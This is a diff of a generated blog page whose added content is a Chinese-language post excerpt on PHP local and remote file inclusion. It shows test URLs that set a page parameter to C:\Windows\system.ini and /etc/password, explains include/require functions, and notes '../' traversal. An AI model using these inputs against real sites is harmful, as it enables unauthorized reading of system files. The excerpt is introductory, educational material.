+<li>远程文件包含，通过http协议包含其他地方的资源。</li>
+</ol>
+<h2 id="可能存在漏洞的页面url："><a href="#可能存在漏洞的页面url：" class="headerlink" title="可能存在漏洞的页面url："></a>可能存在漏洞的页面url：</h2><p><a target="_blank" rel="noopener" href="https://xxx/index.php?page=downloads.php">https://xxx/index.php?page=downloads.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://xxx/index.php?page=main.php">https://xxx/index.php?page=main.php</a></p>
+<p>这种页面最后等于某个文件的有可能包含文件包含漏洞。</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p><a target="_blank" rel="noopener" href="http://xxx/index.php?page=C:%5CWindows%5Csystem.ini">http://xxx/index.php?page=C:\Windows\system.ini</a> //打开c盘windows中system文件</p>
+<p><a target="_blank" rel="noopener" href="http://xxx/index.php?page=/etc/password">http://xxx/index.php?page=/etc/password</a></p>
+<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>require（），找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
+<p>include（），找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
+<p>include__once（）与include（）类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含。</p>
+<p>require__once（）与require（）类似，唯一区别是如果该文件中的代码已经被包含则不会再次包含</p>
+<p>../：返回父目录</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211219141634687.png" alt="image-20211219141634687"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
@@ -471,9 +1358,9 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: false,
+		isHome: true,
 		isPost: false,
-		isArchive: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
